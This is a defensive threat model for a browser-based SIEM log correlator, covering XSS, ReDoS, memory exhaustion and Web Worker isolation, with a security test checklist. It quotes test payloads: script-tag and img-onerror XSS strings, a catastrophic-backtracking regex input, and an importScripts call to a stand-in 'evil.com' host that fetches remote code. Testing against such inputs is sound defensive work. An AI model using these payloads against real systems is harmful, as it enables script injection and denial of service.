# Application Security Threat Model

## Overview

This document describes the threat model for the SIEM Rule Engine & Log Threat Correlator. The application processes hostile, untrusted log data from arbitrary sources. Every log line must be treated as a potential attack vector targeting the application itself.

## Threat Surface

The primary attack surface is the **log ingestion pathway**: raw text data uploaded by users or loaded from preset files. This data may contain:

- Embedded HTML/JavaScript for XSS attacks
- ANSI escape sequences for terminal injection
- Crafted strings designed to cause catastrophic regex backtracking (ReDoS)
- Extremely long lines designed to exhaust memory
- Binary/null-byte data designed to corrupt parsing state
- Unicode homoglyph attacks
- Log injection patterns (CRLF injection, log forging)

---

## Threat 1: Client-Side XSS via Malicious Log Strings

### Attack Vector

An attacker crafts log entries containing HTML or JavaScript payloads:

```
192.168.1.1 - - [01/Jan/2024:00:00:00 +0000] "GET /<script>alert('xss')</script> HTTP/1.1" 200 1234
```

If the application renders this raw log line using `innerHTML` or `dangerouslySetInnerHTML`, the embedded script executes in the user's browser context.

### Mitigations

1. **Strict Text Node Construction**: All log data is rendered using React's default JSX text interpolation (`{variable}`), which automatically escapes HTML entities. The `dangerouslySetInnerHTML` prop is banned project-wide.

2. **Pipeline-Level HTML Entity Escaping**: The `XSSShieldHandler` in the sanitization chain performs character-by-character replacement of dangerous characters (`&`, `<`, `>`, `"`, `'`, `` ` ``) with their HTML entity equivalents before any log data reaches the UI layer.

3. **ANSI/Control Character Stripping**: The `AnsiSanitizerHandler` removes all ANSI escape sequences (`\x1b[...`) and non-printable control characters (`\x00-\x08`, `\x0b`, `\x0c`, `\x0e-\x1f`, `\x7f`) that could be used for terminal injection or rendering manipulation.

4. **Defense in Depth**: Even though React escapes by default, the pipeline sanitization ensures that log data stored in state, IndexedDB, or transmitted via `postMessage` is already neutralized.

### Residual Risk

**Low.** Triple-layer defense (pipeline escaping + React text nodes + no innerHTML) provides robust XSS prevention.

---

## Threat 2: ReDoS (Regular Expression Denial of Service)

### Attack Vector

An attacker crafts a log line with pathological input that causes catastrophic backtracking in a poorly-constructed regex:

```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
```

Against a pattern like `/^(a+)+$/`, this causes exponential-time evaluation, freezing the processing thread.

### Mitigations

1. **Aho-Corasick Prioritization**: The primary signature detection mechanism uses the Aho-Corasick deterministic finite automaton, which guarantees O(n + m + z) time complexity regardless of input content. No regex is used for signature matching.

2. **Length Guards on Regex Paths**: The `ReDoSGuardHandler` enforces a maximum line length of 8,192 characters. Any line exceeding this limit is truncated before it reaches regex-based format detection or field extraction.

3. **Bounded Regex Patterns**: All regex patterns used for log format detection (Syslog, CLF, AuthLog) are:
   - Non-backtracking where possible (using possessive quantifiers or atomic groups)
   - Applied only to length-checked input
   - Designed with bounded repetition operators (`{1,256}` instead of `+` or `*`)

4. **Timeout Mitigation via Worker Isolation**: Even if a regex takes longer than expected, the processing occurs in a Web Worker thread. The main UI thread remains responsive, and the Worker can be terminated and restarted if necessary.

### Residual Risk

**Very Low.** Aho-Corasick handles the computationally expensive path. Regex usage is minimized, length-bounded, and Worker-isolated.

---

## Threat 3: Memory Exhaustion (OOM & UI Freezing)

### Attack Vector

An attacker submits a massive log file (millions of lines) or crafts logs that cause unbounded growth in sliding window partitions (millions of unique source IPs each creating a partition).

### Mitigations

1. **Web Worker Isolation**: The detection engine runs entirely in a dedicated Web Worker. Memory exhaustion in the Worker does not crash the main UI thread. The Worker can be terminated and restarted gracefully.

2. **Backpressure Protocol**: Log ingestion is batched in groups of 500 lines per `postMessage`. The Worker processes batches sequentially, preventing message queue flooding.

3. **Bounded Sliding Window Partitions**: The `SlidingWindowRule` enforces:
   - Maximum 10,000 partitions per rule (oldest partitions evicted via LRU when exceeded)
   - Maximum 1,000 entries per partition deque (oldest entries evicted on overflow)
   - Periodic housekeeping (every 5 seconds) evicts expired entries from all partitions

4. **Alert Buffer Capacity**: The UI-side alert buffer is capped at 10,000 alerts with FIFO eviction. Historical alerts beyond this limit are persisted to IndexedDB.

5. **Deque Memory Bounds**: The `Deque<T>` implementation uses a ring buffer that doubles capacity on demand but is capped at the per-partition maximum. This prevents any single partition from consuming unbounded memory.

6. **Batch Processing Limits**: The Worker processes at most 500 log lines per message cycle, yielding control to allow housekeeping and telemetry updates between batches.

### Residual Risk

**Low.** All collections are bounded. OOM in the Worker is isolated from the UI. Worst case: Worker is terminated and restarted with loss of in-flight state.

---

## Threat 4: Worker Scope Isolation

### Attack Vector

Malicious log data processed in the Worker thread could theoretically attempt to:

- Import external scripts via `importScripts()`
- Access the DOM (not possible in Worker scope)
- Exfiltrate data via network requests from the Worker

### Mitigations

1. **Worker Scope Restrictions**: Web Workers have no access to the DOM, `document`, `window`, or any UI APIs. This is enforced by the browser runtime.

2. **No Dynamic Script Loading**: The Worker does not use `importScripts()` or dynamic `import()` with user-controlled paths. All code is bundled at build time by Vite.

3. **Content Security Policy**: The application should be deployed with a strict CSP:

   ```
   Content-Security-Policy:
     default-src 'self';
     script-src 'self';
     worker-src 'self' blob:;
     style-src 'self' 'unsafe-inline';
     font-src 'self' https://fonts.gstatic.com;
     connect-src 'self';
     img-src 'self' data:;
   ```

4. **Local Execution Boundary**: All log processing occurs locally in the browser. No log data is transmitted to external servers. The application functions entirely offline after initial page load.

5. **Structured Clone Serialization**: All data crossing the Worker/Main thread boundary goes through the structured clone algorithm, which strips functions, DOM references, and other non-serializable objects.

### Residual Risk

**Very Low.** Browser-enforced Worker isolation provides strong containment. CSP adds an additional layer of restriction.

---

## Security Testing Checklist

| Test Case                                             | Expected Result                                     |
| ----------------------------------------------------- | --------------------------------------------------- |
| Ingest `<script>alert(1)</script>` in log line        | Text rendered safely, no script execution           |
| Ingest `<img onerror=alert(1) src=x>` in log line     | HTML entities escaped, no image element created     |
| Ingest ANSI `\x1b[31mRED\x1b[0m` in log line          | ANSI sequences stripped, plain text "RED" displayed |
| Ingest 100,000-character single line                  | Truncated to 8,192 characters, no UI freeze         |
| Ingest 50,000 log lines in single batch               | Processed in Worker without main thread blocking    |
| Generate 10,000+ unique source IPs                    | Partitions bounded, oldest evicted                  |
| Inject null bytes `\x00` in log line                  | Control characters stripped                         |
| Attempt `importScripts('https://evil.com')` in Worker | Not possible — no user-controlled import paths      |
